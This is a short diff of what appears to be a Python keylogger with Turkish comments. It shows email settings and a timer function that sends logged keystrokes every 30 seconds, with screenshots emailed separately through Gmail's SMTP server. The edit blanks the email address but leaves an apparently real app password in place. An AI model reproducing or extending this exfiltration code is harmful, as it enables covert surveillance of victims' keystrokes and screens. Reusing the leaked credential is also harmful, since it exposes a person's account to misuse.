@@ -49,14 +49,14 @@ def callback_function(key):
 
 
 # E-posta ayarları
-email_sender = "rastgeletryhackme@gmail.com"
-email_receiver = "rastgeletryhackme@gmail.com"
+email_sender = "@gmail.com"
+email_receiver = "@gmail.com"
 email_subject = "Ekran Görüntüsü"
 
 # E-posta sunucusu ve kimlik doğrulama bilgileri
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
-smtp_username = "rastgeletryhackme@gmail.com"
+smtp_username = "@gmail.com"
 smtp_password = "emiokybnnrttvizv"
 
 def send_email(filename):
@@ -105,7 +105,7 @@ def sender_email(email,password,message):
 
 def thread_function():
     global log
-    sender_email("rastgeletryhackme@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
+    sender_email("", "emiokybnnrttvizv", log.encode('utf-8'))
     log = ""
     timer_object = threading.Timer(30,thread_function)
     timer_object.start()
